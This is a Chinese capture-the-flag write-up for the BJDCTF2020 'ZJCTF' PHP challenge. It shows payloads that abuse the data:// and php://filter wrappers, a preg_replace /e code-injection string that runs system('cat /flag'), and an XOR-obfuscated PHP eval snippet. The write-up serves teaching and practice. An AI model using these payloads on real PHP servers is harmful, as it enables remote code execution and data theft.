## [BJDCTF2020]ZJCTF，不过如此

1.先看代码，提示了next.php，绕过题目的要求去回显next.php的base64加密内容

2.可以看到要求存在text内容而且text内容强等于后面的字符串，而且先通过这个if才能执行下面的file参数。

![](https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627125355970-702323601.png)

3.看到用的是file_get_contents()函数打开text。想到用data://协议

4.payload: ?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php

5.得到next.php的内容

```
<?php  
$id = $_GET['id'];  
$_SESSION['id'] = $id;  
  
function complex($re, $str) {  
    return preg_replace(  
        '/(' . $re . ')/ei',  
        'strtolower("\\1")',  
        $str  
    );  
}  
  
  
foreach($_GET as $re => $str) {  
    echo complex($re, $str). "\n";  
}  
  
function getFlag(){  
    @eval($_GET['cmd']);  
}  

```
5.这里的漏洞出在**preg_replace** **/e** 模式下

e模式下的preg_replace可以让第二个参数'替换字符串'当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower("\1")正好表达的就是匹配区的第一个（\\1=\1），从而我们如果匹配可以，则可以将函数实现。  
比如我们传入  ?.*=**{${phpinfo()}}**  

原句：preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 就变成preg_replace('/(' .* ')/ei','strtolower("\\1")',**{${phpinfo()}}**);

又因为$_GET传入首字母是非法字符时候会把   .（点号）改成下划线，因此得将\.*换成\s*

所有payload：?\S*=${getFlag()}&cmd=system('ls /'); 

![](https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134114716-1034484069.png)

 终于看到了flag，然后将cmd里改成cat /flag即可

```
?\S*=${getFlag()}&cmd=system('cat /flag'); 
```

![](https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134226627-1152733174.png)



```
$_="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$_();
```

```
[php]${eval($_GET[_])}[php]&_=phpinfo();
```
